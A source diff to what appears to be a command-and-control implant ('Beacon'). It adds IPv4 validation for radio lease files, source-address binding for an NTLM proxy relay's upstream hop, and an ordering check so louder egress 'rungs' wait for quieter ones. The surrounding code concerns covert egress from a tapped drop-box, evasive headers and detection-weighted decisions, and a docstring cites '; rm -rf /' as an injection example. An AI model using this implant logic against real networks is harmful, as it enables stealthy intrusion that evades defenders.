@@ -2240,6 +2240,17 @@ def _radio_lease(path: str) -> Tuple[str, int, str]:
     An unreadable or incomplete lease answers with empty strings, which the
     rung treats as a failure and rolls back: a radio with an address and no
     gateway is a change the operator cannot see.
+
+    **And a value that is not an address answers the same way.** dhclient
+    is the only thing that writes this file today, but the file lives in
+    the state directory this project already hardens against a local
+    attacker who got there first -- and what is read from it goes into
+    `ip rule add from <x>` and `ip addr replace <x>/<n>`. Nothing here
+    runs a shell, so the cost of a bad value is a confusing argv rather
+    than an injection; it is refused anyway, because "the lease is
+    incomplete" is a failure the rung already knows how to roll back and
+    "the lease says `; rm -rf /`" is not a reading this function should
+    pass on.
     """
     try:
         with open(path, "r") as handle:
@@ -2263,7 +2274,22 @@ def _radio_lease(path: str) -> Tuple[str, int, str]:
                 continue
             if 0 < bits <= 32:
                 prefix = bits
+    if not _is_ipv4(address):
+        address = ""
+    if not _is_ipv4(router):
+        router = ""
     return address, prefix, router
+
+
+def _is_ipv4(value: str) -> bool:
+    """Whether `value` is a dotted-quad address and nothing else."""
+    parts = (value or "").split(".")
+    if len(parts) != 4:
+        return False
+    for part in parts:
+        if not part.isdigit() or len(part) > 3 or not 0 <= int(part) <= 255:
+            return False
+    return True
 
 
 # ── The way out: the files the scout and the beacon meet over ──
@@ -3097,6 +3123,13 @@ class _NtlmProxyRelay:
         self._server: Optional[socket.socket] = None
         self._thread: Optional[threading.Thread] = None
         self._running = False
+        # The local address the hop to the upstream proxy leaves by, or
+        # None for the kernel's choice. Set by `Beacon._way_out_bind`
+        # while the radio rung holds a lease: see `_connect_upstream`.
+        # Not passed to `__init__`, because the relay is started long
+        # before any rung runs and the rung has to be able to reach a
+        # relay that is already serving.
+        self.source_address = None
 
     @staticmethod
     def _split_identity(username: str, domain: str) -> tuple:
@@ -3270,6 +3303,16 @@ class _NtlmProxyRelay:
     def _connect_upstream(self) -> socket.socket:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.settimeout(self._HANDSHAKE_TIMEOUT)
+        # The way out's radio rung, if it holds a lease: this is the hop
+        # that actually leaves the device on an `proxy.ntlm.enabled`
+        # build. The session the rung binds connects to `127.0.0.1`,
+        # which is this relay's listener -- so without this the rung
+        # installed its source rule, reported "this implant's own traffic
+        # only", and the traffic went out of the dead tapped port. The
+        # same failure round two found on rung 3 itself, on the one proxy
+        # configuration nobody had checked.
+        if self.source_address:
+            sock.bind(self.source_address)
         sock.connect(self._upstream)
         return sock
 
@@ -3705,6 +3748,18 @@ class ProxyDiscovery:
             pass
 
     def _detect_wpad(self):
+        # **Two name lookups that the way out's radio rung cannot bind.**
+        # `socket.gethostbyname` goes through the system resolver, which
+        # takes no source address and whose configuration this project
+        # does not rewrite at runtime -- so while rung 3 holds a lease
+        # these two queries still leave by whatever route
+        # `/etc/resolv.conf` points at, which on a tapped drop-box is the
+        # port the rung exists to get off. The lookups carry no payload,
+        # name only `wpad` and `wpad.<search domain>`, and are made only
+        # when an operator or the decider asks for discovery. The limit is
+        # written here and in `docs/WAY_OUT.md` rather than implied; the
+        # beacon's own DNS queries, which it builds itself, do take the
+        # bind -- see `_dns_query`'s `source`.
         try:
             addr = socket.gethostbyname("wpad")
             if addr:
@@ -7014,8 +7069,14 @@ class Beacon:
             # `http_proxy` in the implant's environment would do it too.
             #
             # And bare rather than `_bound_session`, which is the one place
-            # that is deliberate: a connection to `127.0.0.1` from the
-            # radio rung's leased address cannot be made at all.
+            # that is deliberate: the peer is on this host, so the radio
+            # rung's route has nothing to do with this connection and its
+            # source rule can never match it. Not because the bind would
+            # fail -- measured on Linux and on macOS, a socket bound to a
+            # non-loopback local address connects to `127.0.0.1` perfectly
+            # well, and an earlier comment here claimed otherwise. It is
+            # skipped because binding a local forward to an address a
+            # radio lease may drop at any moment buys nothing.
             session = _HttpSession()
             session.trust_env = False
         hdrs = self._post_headers() if endpoint == "result" else self._evasive_headers()
@@ -10529,6 +10590,16 @@ class Beacon:
             session.headers = dict(previous.headers)
             session.trust_env = previous.trust_env
         self._proxy_session = session
+        # And the relay, on a build that has one. The session above
+        # connects to `127.0.0.1` there -- the relay's own listener -- so
+        # binding it alone left the hop that actually leaves the device
+        # unbound, and the rung reported "this implant's own traffic only"
+        # while HTTP went out of the dead tapped port. The same failure
+        # round two found on rung 3 itself, on the one proxy
+        # configuration nobody had checked.
+        relay = self._ntlm_relay
+        if relay is not None:
+            relay.source_address = (address, 0) if address else None
 
     def _bound_session(self) -> "_HttpSession":
         """A fresh HTTP session that still leaves by the leased address.
@@ -10554,8 +10625,11 @@ class Beacon:
         path switch belongs here, where adding it reaches all five.
 
         The one deliberate exception is the loopback forward in
-        `_https_post`, which builds a bare session: a connection to
-        `127.0.0.1` from a radio lease's address cannot be made at all.
+        `_https_post`, which builds a bare session: its peer is on this
+        host, so no source rule of the rung's can ever match it and the
+        bind would only pin it to a lease that may be dropped. The
+        relay's own upstream hop is **not** an exception -- see
+        `_way_out_bind`.
         """
         session = _HttpSession()
         if self._way_out_source:
@@ -11077,6 +11151,27 @@ class Beacon:
         ev = points * success - coefficient * detect
         ev_prior = points * prior_success - coefficient * detect
         allowed = ev > threshold
+        # **And the ladder is an order, not only a price.** The page prints
+        # that promise in bold -- "a louder rung may never become
+        # available before a quieter one" -- and a model's `p_success`
+        # broke it: clamped to the prior + 0.2, an estimate of 0.99 on
+        # `identity` moved rung 4's crossing from hour 7 to hour **4**,
+        # while rung 3 stayed at hour 5 on the table. So the implant could
+        # be talked into the one irreversible move before it had ever been
+        # allowed to try its own radio. The clamp bounds the probability;
+        # it was never going to bound the ordering, because it is applied
+        # only to the verb that was named.
+        #
+        # Checked against each quieter rung's **own prior**, so this is
+        # structural: whatever a model proposes, and whatever the operator
+        # has configured, rung n waits for rung n-1 to have crossed on the
+        # table. The evidence modifiers are kept, because they move a rung
+        # in the direction the reader already consented to and the reader
+        # cannot invert them.
+        blocked = self._way_out_out_of_order(rung, points, coefficient,
+                                             threshold) if allowed else ""
+        if blocked:
+            allowed = False
         numbers = {
             "rung": rung,
             "row": row,
@@ -11091,6 +11186,7 @@ class Beacon:
             "ev": ev,
             "ev_prior": ev_prior,
             "allowed": allowed,
+            "blocked_by": blocked,
             # Marked the way `override_decisive` marks it on the server, so
             # the trail says which decisions rested on a model's estimate
             # rather than on the table.
@@ -11102,7 +11198,40 @@ class Beacon:
             % (rung, row, points, success, points * success, coefficient,
                detect, coefficient * detect, ev,
                "exceeds" if allowed else "does not exceed", threshold))
+        if blocked:
+            numbers["why"] += (
+                ", which it does -- but %s has not crossed yet, and a "
+                "louder rung may not be taken before a quieter one" % blocked)
         return allowed, numbers
+
+    def _way_out_out_of_order(self, rung: int, points: int,
+                              coefficient: float, threshold: float) -> str:
+        """The quieter rung that has not crossed yet, or "" if all have.
+
+        Each on its **own prior**, never on a proposed `p_success`: the
+        question is whether the curve has reached the quieter rung, and a
+        model's estimate about one verb says nothing about another.
+
+        The evidence modifier is applied, because "has it become
+        available" includes the evidence -- though with the shipped
+        numbers, and with every configuration the reader accepts, it
+        cannot change the answer: the only modifier on a quieter rung is
+        `portal_detect`, which may only *lower* rung 2's detection and so
+        only moves its crossing earlier than a floor that is already
+        below the rung being asked about. A mutation check recorded that
+        survivor rather than engineering a contrived configuration for
+        it; the modified value is kept because it is the one that means
+        what this reads as.
+        """
+        for lower in sorted(_WAY_OUT_ROW_OF):
+            if lower >= rung:
+                break
+            row = _WAY_OUT_ROW_OF[lower]
+            _, success, prior_detect = _WAY_OUT_ROWS[row]
+            detect = self._way_out_detect(lower, prior_detect)
+            if not points * success - coefficient * detect > threshold:
+                return row
+        return ""
 
     def _way_out_detect(self, rung: int, prior: float) -> float:
         """`p_detect` for this rung, moved by the evidence.
